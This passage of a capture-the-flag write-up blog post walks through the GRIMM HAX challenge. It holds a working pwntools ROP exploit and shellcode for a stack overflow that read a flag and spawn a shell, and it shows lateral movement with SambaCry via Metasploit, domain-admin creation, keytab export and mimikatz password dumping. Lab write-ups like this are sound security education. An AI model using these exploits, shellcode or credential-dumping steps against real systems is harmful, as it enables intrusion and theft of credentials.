+<p>From this result. We can see that NX is disabled and there are RWX segments. Possible solutions may be the classic stack buffer overflow where data read to a buffer is executed. However, I still needed to find a way to bypass ASLR with the assumption that ASLR is enabled by default on the remote host. Let&rsquo;s do some reverse engineering on the binary to gather some information.</p>
+
+<p><img src="/img/GRIMM-hax-combined/38.PNG" alt="lister-4" /></p>
+
+<p>Open the main function, we can see what was going on:</p>
+
+<ul>
+<li>The program listen on port 12345 and waiting for connection</li>
+<li>Everytime a client connects to the program, it makes a fork and run the main functionality:
+
+<ul>
+<li>Asking for a directory path to list all the files in there</li>
+<li><strong>It receives at most <code>0x200</code> bytes of input for the path. However the buffer is only <code>0x140</code> byte-long. There is obviously a stack buffer-overflow here</strong></li>
+<li>It replaces the character at <code>strlen(input)-2</code> with a NULL byte. This is why we see the last character being eaten up</li>
+<li>It sends back the modified buffer to the client</li>
+<li>It uses the <code>opendir</code> and <code>readdir</code> functions (in the <code>ls</code> function) to list files in the provided path. If the path is not a directory or any error happenned, the string &ldquo;Directory does not exist.&rdquo; is returned.</li>
+<li>Note that in the main program, whenever it attempts to send data to the client, it uses the custom <code>sendstring</code> function, which uses <code>strlen</code> to determine the length of the buffer to be sent.</li>
+</ul></li>
+</ul>
+
+<p>From the above observation, I came up with the following plans to exploit the binary:</p>
+
+<ol>
+<li>Take advantage of the input being echoed back to the client to leak addresses on the stack to bypass ASLR and then overwrite rip with a ROP chain to <code>system(&quot;/bin/sh&quot;)</code>. I wanted to leak the address of <code>__libc_start_main+234</code> so that I could calculate the base address of libc. However, this did not work (or it&rsquo;s just me haven&rsquo;t figure out if this is possible) for the following reasons:
+
+<ul>
+<li>The buffer was sent using the <code>sendstring</code> custom function, which uses <code>strlen</code> to determine the buffer length. It will stop when it hits a NULL byte.</li>
+<li>The <code>fd</code> local variable is before the address that I needed to leak, and it takes up 4 bytes. However, the actual correct <code>fd</code> does not take up this many bytes so there will be NULL bytes before the address we need to leak. If I overwrite the <code>fd</code> to some incorrect value to bypass <code>strlen</code>, the output will not be sent back to the client.</li>
+</ul></li>
+<li>At this moment, I realized that the main function attempts to close the client fd before it returns. In this approach, I overflow the buffer to overwrite the fd with wrong values so the socket is not closed when the main function returns, and <strong>THEN</strong> control rip to read in my shellcode and execute it. In this way, I did not have to guess the stack address and still achieve a partially arbitrary write.</li>
+</ol>
+
+<p>I used ROP to make the program read my shellcode in. However, there were 2 problems that I needed to solve before I can write the exploit:</p>
+
+<ol>
+<li>Identify the version of the libc being used since it was not given.
+I first tried to locate glibc on my Kali machine, which was in <code>/lib/x86_64-linux-gnu/</code>. However, I did not find it on the remote machine and did not know why. I played a little bit more with the program on the remote host and figure out the <code>/home</code> directory contains the user <code>ec2-user</code>.
+<img src="/img/GRIMM-hax-combined/31.PNG" alt="lister-5" />
+Having worked with the Linux-AMI of AWS EC2 before, I immediately knew that this was running on a RHEL machine in oppose to my Debian machine. I setup an EC2 instance myself and study the filesystem. Turned out that it was in <code>/lib64</code>
+<img src="/img/GRIMM-hax-combined/32.PNG" alt="lister-6" /></li>
+<li>Identify the base address of libc.
+Having worked with Linux for a while, I knew that the memory mapping of a process is stored in <code>/proc/&lt;pid&gt;/maps</code>. However, it is not possible to read file using the program. It can only list files in a directory. I played around with the <code>/proc</code> directory and found out that the directory <code>/proc/&lt;pid&gt;/map_files</code> also contains parts of the information in the maps file. As you can see later in the asciinema record, there are filenames that are address ranges. They are indeed symlinks to the actual libc and from there, I was able to identify the base address of libc</li>
+</ol>
+
+<p><img src="/img/GRIMM-hax-combined/39.PNG" alt="lister-7" /></p>
+
+<p>But how did I figure out the PID of the process? With the assumption that most of the time, newly spawned processes on the remote machine are only the children of the <code>lister</code> process, I took the following steps to get the PID of a child process:</p>
+
+<ul>
+<li>Connect to the service to create a process. Read the <code>/proc</code> directory</li>
+<li>Connect to the service the second time to create a new process. Read the <code>/proc</code> directory again</li>
+<li>The difference between the 2 output is the PID of the newly created process the second time we connect to the service.</li>
+</ul>
+
+<p>From this point on, I had all the necessary information to write the exploit. The code below has comments to help you understand it.</p>
+
+<pre><code>from pwn import *
+import string
+
+context.arch = 'amd64'
+
+HOST = &quot;10.123.15.53&quot;
+PORT = 12345
+#HOST = &quot;localhost&quot;
+#PORT = 1234
+
+libc = ELF('./libc-2.17.so')
+libc_base = 0x7fd9dcd83000
+
+gadgets = {}
+gadgets['system'] = libc.symbols['system']
+gadgets['binsh'] = next(libc.search(&quot;/bin/sh\x00&quot;))
+gadgets['pop_rdi'] = 0x22298
+gadgets['syscall'] = 0xc0065
+gadgets['pop_rax'] = 0x1d150
+gadgets['pop_rsi'] = 0x21738
+gadgets['pop_rdx'] = 0x1b92
+gadgets['xor_rax_rax'] = 0x8906f
+gadgets['push_rax'] = 0xa5e8
+
+context.log_level = 'ERROR'
+
+
+def getDir(dirToList):
+    print &quot;Getting {}&quot;.format(dirToList)
+    M = &quot;&quot;
+    for i in range(0, 10): # Pad the path with additional characters because of the glitch
+        try:
+            s = remote(HOST, PORT)
+            payload = '/' * i + '{}/'.format(dirToList)
+            s.sendline(payload)
+            m = &quot;&quot;
+            while True:
+                try:
+                    c = s.recv(1)
+                    m += c
+                except:
+                    break
+            s.close()
+            if &quot;Directory does not exist&quot; not in m:
+                M = m
+                break
+        except:
+            s.close()
+    return M
+
+def getProcesses():
+    m = getDir(&quot;/proc&quot;).strip('\n').split('\n')
+    m = [int(x) for x in m if not any(e in x for e in (string.ascii_letters + string.punctuation))]
+    return m
+
+def getMapFiles(pid):
+    m = getDir(&quot;/proc/{}/map_files&quot;.format(pid))
+    return m
+
+def createHang():
+    s = remote(HOST, PORT)
+    return s
+
+def setRDI(num):
+    return p64(gadgets['pop_rdi']) + p64(num)
+
+def setRAX(num):
+    return p64(gadgets['pop_rax']) + p64(num)
+
+def setRSI(num):
+    return p64(gadgets['pop_rsi']) + p64(num)
+
+def setRDX(num):
+    return p64(gadgets['pop_rdx']) + p64(num)
+
+def readBuf(addr, length, fd=4, skipfd=False):
+    payload = &quot;&quot;
+    payload += setRAX(0)
+    if not skipfd:
+        payload += setRDI(fd)
+    payload += setRSI(addr)
+    payload += setRDX(length)
+    payload += p64(gadgets['syscall'])
+    return payload
+
+def main():
+    # Get pid of the program
+    p = getProcesses()
+    s = createHang()
+    p1 = getProcesses()
+    diff = [int(x) for x in p1 if x not in p]
+    print diff
+    for pid in diff:
+        m = getMapFiles(pid)
+        print m
+
+    # After obtaining the libc base address, calculate all the gadget addresses
+    for k in gadgets.keys():
+        gadgets[k] += libc_base
+        print k, hex(gadgets[k])
+    
+    # Building shellcode
+    filename = &quot;flag.txt&quot;
+    shellcode = filename + '\x00'
+    shellcode += asm(open('shellcode.asm').read())
+
+    # Trigger the overflow
+    payload = 'A' * (320 - 8)
+    payload += p64(0)
+    payload += 'B' * 8 # rbp
+    # ROP chain to read shellcode to a RWX memory segment
+    payload += readBuf(0x601000, len(shellcode) + 1) # read file name
+    payload += p64(0x601000 + len(filename + &quot;\x00&quot;) + 1)
+
+    print len(payload) # The length must not exceed 0x200
+    s = createHang()
+    print s.recv()
+
+    s.sendline(payload)
+    s.sendline(shellcode)
+
+    print s.recv(40)
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<p>Shellcode:</p>
+
+<pre><code>nop
+nop
+nop
+; Open file
+mov rax, 2
+mov rdi, 0x601000
+xor rsi, rsi
+xor rdx, rdx
+syscall
+; Read file
+mov rdi, rax
+xor rax, rax
+mov rsi, 0x601c00
+mov rdx, 40
+syscall
+; Write buffer to client fd
+mov rax, 1
+mov rdi, 4
+syscall
+nop
+nop
+nop
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/34.PNG" alt="lister" /></p>
+
+<p>The flag is <code>GRIMM-STACK-OVERFLOWD</code></p>
+
+<h2 id="secondary-control-300pts">Secondary Control (300pts)</h2>
+
+<p>With the provided description (&ldquo;The Administrator may CRY if you get further into their network&rdquo;) I was certain that the exploit gotta be the famous MS17-010 from WannaCry. From the nmap scan before and with a little bit of DNS enumeration, I figured out that there are 2 Domain Controllers on the network. The primary DC at <code>10.123.15.10</code> is a Windows Server 2016 machine, while the secondary DC at <code>10.123.15.20</code> is unknown. At this point, I have not obtained a shell on the lister machine yet and only tried to enumerate the network more and more from the gitlab-runner machine. However, the exploit did not work against the primary DC.</p>
+
+<p>It took me quite a long time to decide to move on to obtaining a shell on the lister machine and this is one of the mistake that I&rsquo;ve made. I should have done this earlier because later on, to progress, I needed to pivot through the lister machine. Using the same exploit from the previous level and modify the shellcode, I was able to obtain a shell through the existing connection with the binary. Here is the shellcode with descriptive comments:</p>
+
+<pre><code>nop
+nop
+nop
+; dup2(stdin, 4) since 4 is the client fd.
+mov rax, 33
+mov rdi, 4
+xor rsi, rsi
+syscall
+; dup2(stdout, 4)
+mov rax, 33
+inc rsi
+syscall
+; dup2(stderr, 4)
+mov rax, 33
+inc rsi
+syscall
+; execve(&quot;/bin/sh&quot;, 0, 0). From the exploit, a &quot;/bin/sh&quot; string was placed at 0x601000
+mov rax, 59
+xor rdx, rdx
+mov rsi, rdx
+mov rdi, 0x601000
+syscall
+; After the syscall, stdin, stdout and stderr was redirected to our client fd and we are interacting with /bin/sh on the remote machine now
+nop
+nop
+nop
+</code></pre>
+
+<p>I again used an SSH-tunnel to forward <code>10.123.15.53:12345</code> to <code>127.0.0.1:1234</code></p>
+
+<pre><code>ssh -D 1337 -i grimmKey gitlab-runner@10.123.14.12
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/33.PNG" alt="DC2-0" /></p>
+
+<p>After obtaining this basic shell, I again upgraded it to a meterpreter shell so that I can manage them all in metasploit from one of my EC2 instance.</p>
+
+<p>At the same moment I realized that there is not only one exploit that has <em>CRY</em> in its name. There was also <strong>SambaCRY</strong>. I then proceeded to use Metasploit&rsquo;s autoroute to pivot through the meterpreter session on the lister machine and scan the networks for open 445 port. And BOOOM! The secondary DC is now visible through pivoting:</p>
+
+<p><img src="/img/GRIMM-hax-combined/18.PNG" alt="DC2-1" /></p>
+
+<p>Metasploit actually has a module to exploit SambaCry <a href="https://www.rapid7.com/db/modules/exploit/linux/samba/is_known_pipename">here</a>. Running the exploit against the secondary DC at <code>10.123.15.20</code> gave me a shell.</p>
+
+<p><img src="/img/GRIMM-hax-combined/19.PNG" alt="DC2-1" /></p>
+
+<p>The flag is in <code>/root</code> and is <code>GRIMM-I-SAMBA-CRY-EVERY-TIME</code>.</p>
+
+<p><img src="/img/GRIMM-hax-combined/20.PNG" alt="DC2-1" /></p>
+
+<p>As always, I upgraded this shell to a meterpreter shell for easy management.</p>
+
+<h2 id="prime-location-400pts">Prime Location (400pts)</h2>
+
+<p>After got onto the secondary DC, I still did not understand how a Linux machine could be a Domain Controller. Turned out that it can be done using samba. I started to do enumeration on the localhost and found some interesting stuffs.</p>
+
+<ul>
+<li>Samba was connecting to the primary DC
+<img src="/img/GRIMM-hax-combined/21.PNG" alt="DC1-1" /></li>
+<li>Where samba was running from
+<img src="/img/GRIMM-hax-combined/22.PNG" alt="DC1-2" /></li>
+<li>Samba configuration files and some data
+<img src="/img/GRIMM-hax-combined/23.PNG" alt="DC1-3" /></li>
+</ul>
+
+<p>Although these are interesting information, for example the secrets files that contains encrypted credentials or the Kerberos keytab, I did not use these to gain access to the primary DC. However, I did came across many new things during investigating these information. For example, I was able to obtain the hash</p>
+
+<p>While I tried using Kerberos utils like in <a href="https://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html">this</a> blog post, I noticed that samba-tool was there but I didn&rsquo;t use it. Further more, I looked at the bash history and realized that I really should have tried it earlier.</p>
+
+<p><img src="/img/GRIMM-hax-combined/24.PNG" alt="DC1-4" /></p>
+
+<p>I guess maybe this was just a hint, and I tried the same thing: create a new user and add it to the Domain Admins group. And now I am a Domain Admin!</p>
+
+<p><img src="/img/GRIMM-hax-combined/25.PNG" alt="DC1-5" /></p>
+
+<p>There is another way to get the flag that I would also like to show you in this writeup, which uses <code>smb-client</code> to access the shares on the primary DC:</p>
+
+<ul>
+<li><p>Use <code>samba-tool</code> to export the keytab from the primary DC</p>
+
+<pre><code>/usr/local/samba/bin/samba-tool domain exportkeytab /tmp/test.keytab
+</code></pre></li>
+
+<li><p>Init a new Kerberos ticket for <code>smb-client</code> on DC2</p>
+
+<pre><code>kinit -k -t /tmp/test.keytab CEO@CORP.HAX
+</code></pre></li>
+
+<li><p>Use <code>smb-client</code> with the generated ticket</p>
+
+<pre><code>smbclient -k //dc1.corp.hax/C\$/ -c ls
+smbclient -k //dc1.corp.hax/C\$/ -c &quot;get Users\\Administrator\\flag.txt /tmp/flag.txt&quot;
+</code></pre></li>
+</ul>
+
+<p>And the flag is <code>GRIMM-DOMAIN-ADMIN-BEST-ADMIN</code>.</p>
+
+<p><img src="/img/GRIMM-hax-combined/26.PNG" alt="DC1-6" /></p>
+
+<h2 id="forgotten-password-400pts">Forgotten Password (400pts)</h2>
+
+<p>This level is a little bit tricky if you did not get it quickly. From the description, I assumed that I needed to use mimikatz to retrieve that password of the <code>CEO</code> user. I tried to use Internet Explorer to download mimikatz but it didn&rsquo;t allow me to save the file so I used this following Powershell script to download it:</p>
+
+<pre><code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile(&quot;https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180502/mimikatz_trunk.zip&quot;,&quot;C:\Users\fpasswd1\Desktop\meme.zip&quot;)
+</code></pre>
+
+<p>After RDP into the machine, you may encounter a cmd window that appears for a few seconds and then disappers. I did not notice that at first and thought I hit a dead end by just using mimikatz. That turned out to be a task to perform the login of the <code>CEO</code> user so that I could retrieve the password from memory. It took me a while to figure that out. To trigger the action again, just go to Task Scheduler and run the action.</p>
+
+<p><img src="/img/GRIMM-hax-combined/27.PNG" alt="CEO-1" /></p>
+
+<p>And then use mimikatz to get the passwords:</p>
+
+<pre><code>mimikatz# privilege::debug
+mimikatz# sekurlsa::logonPasswords
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/28.PNG" alt="CEO-1" /></p>
+
+<p>The flag is <code>GRIMM-memory-MAGIC</code>.</p>
+
+<h2 id="top-of-the-food-chain-500pts">Top of the Food Chain (500pts)</h2>
+
+<p>Now being the Domain Admin, I could just RDP again into the CEO machine. However I needed to figure out which machine was that in the first place. Open the DNS records, the CEO machine is at <code>10.123.14.122</code> and the hostname is <code>ceo</code>.</p>
+
+<p><img src="/img/GRIMM-hax-combined/29.PNG" alt="TOP-1" /></p>
+
+<p>Let&rsquo;s RDP into that machine as the Domain Admin (yes, RDP inside RDP). The flag is at <code>C:\flag.txt</code>.</p>
+
+<p><img src="/img/GRIMM-hax-combined/30.PNG" alt="TOP-2" /></p>
+
+<p>The flag is <code>GRIMM-BIG-LEAGUE-HAXOR</code>.</p>
+
+              </section>
+
+              <footer class="post-footer">
+                  <div class="post-tags">
+            
+                  </div>
+                
+                    <div class="post-share">
+                        <a class="fa fa-reddit-alien" href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent(window.location); return false">
+                            <span>Reddit</span>
+                        </a>
+                        <a class="fa fa-twitter" href="https://twitter.com/share?text=GRIMM%20HAX%20Combined%20Challenge&url=https%3a%2f%2fsimpleguy.tech%2fpost%2fgrimm-hax-combined-challenge%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                            <span>Twitter</span>
+                        </a>
+                    </div>
+            
+              </footer>
+
+            
+                <aside class="post-comments">
+    
+    
+    <div id="disqus_thread"></div>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+    
+</aside>
+
+            
+            </div>
+
+            <nav class="post-nav">
+                
+                
+                    <a class="post-nav-item post-nav-prev" href="https://simpleguy.tech/post/2017-sans-holiday-hacking-challenge/">
+                        <section class="post-nav-teaser">
+                            <span class="post-nav-icon"><i class="fa fa-chevron-right"></i></span>
+                            <span class="post-nav-info">
+                                <h4 class="post-nav-title">2017 SANS Holiday Hacking Challenge</h4>
+                            </span>
+                        </section>
+                    </a>
+                
+                <div class="clear"></div>
+            </nav>
+
+        </div>
+    </article>
+</main>
+
+                <div id="body-class" style="display: none;"></div>
+                <footer id="footer">
+                    <section class="credits">
+                        <span class="credits-license"><i class="fa fa-copyright"></i>2018 Simple Guy
+                    </span>
+                    </section>
+                </footer>
+                
+
+                
+<div id="menu" data-target="menu">
+    <div class="menu-header">
+        <span class="menu-label">Main Menu</span>
+        <a class="menu-close" data-action="menu" data-target="menu"></a>
+    </div>
+
+    <div class="menu-list">
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/about/">About me</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/projects/">Projects</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/tags/">Tags</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/categories/">Categories</a>
+        </li>
+        
+        <li class="menu-list-item menu-list-social">
+            <a href="https://twitter.com/flyingpassword" title="Simple Guy on Twitter"><i class="fa fa-twitter"></i></a>
+            <a href="https://linkedin.com/in/ducphanduy" title="Simple Guy on LinkedIn"><i class="fa fa-linkedin"></i></a>
+            <a href="https://github.com/ducphanduyagentp" title="Simple Guy on GitHub"><i class="fa fa-github"></i></a>
+        </li>
+    </div>
+
+</div>
+
+
+                
+                <div class="overlay"></div>
+            </div>
+        </section>
+
+    <script async src="/js/main.js"></script>
+
+
+
+  <noscript><link rel="stylesheet" href="/css/main.css"></noscript>
+</body>
+</html>
+
